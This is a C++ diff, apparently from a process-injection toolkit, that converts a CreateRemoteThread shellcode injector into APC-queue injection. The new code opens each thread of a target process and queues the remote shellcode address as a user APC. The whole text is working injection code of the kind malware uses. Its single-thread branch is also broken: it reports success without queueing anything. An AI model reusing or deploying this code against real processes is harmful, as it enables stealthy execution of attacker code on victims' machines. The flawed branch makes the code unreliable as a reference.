@@ -5,7 +5,7 @@
 
 namespace scripts {
 
-bool inject_create_remote_thread(uint32_t pid, RemoteProcessMemoryMethod method) {
+bool inject_queue_apc(uint32_t pid, uint32_t tid, RemoteProcessMemoryMethod method) {
 
     wprintf(L"\nOpening the target process\n");
     sysapi::unique_handle ProcessHandle = sysapi::ProcessOpen(pid);
@@ -38,10 +38,33 @@ bool inject_create_remote_thread(uint32_t pid, RemoteProcessMemoryMethod method)
 
     wprintf(L"  [*] starting new thread with shellcode start address...\n");
 
-    sysapi::unique_handle target_thread = sysapi::ThreadCreate(ProcessHandle.get(), ctx.RemoteBaseAddress);
-    if (target_thread == NULL) {
+    if (tid) {
+        sysapi::unique_handle ThreadHandle = sysapi::ThreadOpen(pid, tid);
+        if (ThreadHandle == NULL) {
+            return false;
+        }
+
+        wprintf(L"\nSuccess\n");
+        return true;
+    }
+
+    wprintf(L"\nQueueing APT in all threads\n");
+
+    sysapi::unique_handle ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get());
+    if (ThreadHandle == NULL) {
         return false;
     }
+
+    do {
+        wprintf(L"  [+] thread opened, HANDLE = 0x%p\n", ThreadHandle.get());
+        res = sysapi::ApcQueueUserApc(ThreadHandle.get(), (PPS_APC_ROUTINE)ctx.RemoteBaseAddress);
+        if (!res) {
+            return false;
+        }
+
+        wprintf(L"  [+] APC queued, HANDLE = 0x%p\n", ThreadHandle.get());
+        ThreadHandle = sysapi::ThreadOpenNext(ProcessHandle.get(), ThreadHandle.get());
+    } while (ThreadHandle != NULL);
 
     wprintf(L"\nSuccess\n");
     return true;
